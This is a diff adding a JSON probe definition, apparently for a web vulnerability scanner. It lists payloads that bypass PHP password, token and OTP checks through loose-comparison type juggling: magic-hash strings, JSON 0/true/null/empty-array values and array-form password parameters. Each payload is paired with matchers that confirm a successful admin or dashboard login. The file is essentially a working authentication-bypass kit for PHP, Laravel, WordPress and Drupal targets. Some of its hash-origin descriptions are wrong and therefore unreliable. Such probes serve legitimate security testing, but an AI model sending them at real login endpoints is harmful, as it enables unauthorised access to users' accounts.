@@ -1,0 +1,107 @@
+{
+  "category": "php_type_juggling",
+  "contexts": {
+    "magic_hash_bypass": {
+      "description": "PHP loose comparison (==) treats '0eXXX' strings as float 0, bypassing password hash checks. Send magic-hash strings that evaluate to 0 under ==.",
+      "tech_match": ["php", "laravel", "wordpress", "drupal", "codeigniter", "symfony"],
+      "param_match": ["password", "pass", "pwd", "token", "hash", "otp", "code", "pin"],
+      "probes": [
+        {
+          "payload": "0e462097431906509019562988736854",
+          "description": "MD5 magic hash (md5('240610708') = 0e...) — loose == comparison with 0 evaluates true",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success", "profile", "account", "redirect"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "0e215962017",
+          "description": "SHA1 magic hash (sha1('10932435112') = 0e...) — loose == with 0",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success", "profile"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "0e1137126905",
+          "description": "MD5 magic hash (md5('QNKCDZO') = 0e...) — alternate collision",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "0",
+          "description": "Integer 0 vs magic hash string — both evaluate to float 0 under ==",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success"]}],
+          "severity": "critical",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "json_type_confusion": {
+      "description": "Send JSON integer 0 or boolean true instead of string password — PHP json_decode + loose == treats 0=='any_string' as true.",
+      "tech_match": ["php", "laravel", "wordpress", "drupal"],
+      "param_match": ["password", "pass", "pwd", "token", "otp", "code"],
+      "probes": [
+        {
+          "payload": "0",
+          "description": "JSON integer 0 — PHP loose == with any non-numeric string evaluates true",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success", "token", "session"]}],
+          "severity": "critical",
+          "confidence_boost": 50,
+          "variables": {"content_type": "application/json"}
+        },
+        {
+          "payload": "true",
+          "description": "JSON boolean true — PHP loose == with non-empty string evaluates true",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success"]}],
+          "severity": "critical",
+          "confidence_boost": 50,
+          "variables": {"content_type": "application/json"}
+        },
+        {
+          "payload": "[]",
+          "description": "Empty array — strcmp([], 'password') returns NULL which == 0 == true in PHP < 8.0",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success"]}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"content_type": "application/json"}
+        },
+        {
+          "payload": "null",
+          "description": "JSON null — loose == with empty string is true",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success"]}],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"content_type": "application/json"}
+        }
+      ]
+    },
+    "strcmp_null": {
+      "description": "PHP strcmp() returns NULL on non-string input (array/object). NULL == 0 is true under loose comparison, bypassing password checks.",
+      "tech_match": ["php", "laravel", "wordpress"],
+      "param_match": ["password", "pass", "pwd"],
+      "probes": [
+        {
+          "payload": "password[]=",
+          "description": "Send password as array (password[]='') — strcmp returns NULL, NULL == 0 is true",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "password[]=%00",
+          "description": "Array with null byte — triggers strcmp NULL return",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success"]}],
+          "severity": "critical",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "password[0]=a&password[1]=b",
+          "description": "Multi-element array parameter — strcmp with array returns NULL",
+          "matchers": [{"type": "status", "status": [200, 302]}, {"type": "word", "words": ["dashboard", "admin", "welcome", "success"]}],
+          "severity": "critical",
+          "confidence_boost": 40
+        }
+      ]
+    }
+  }
+}
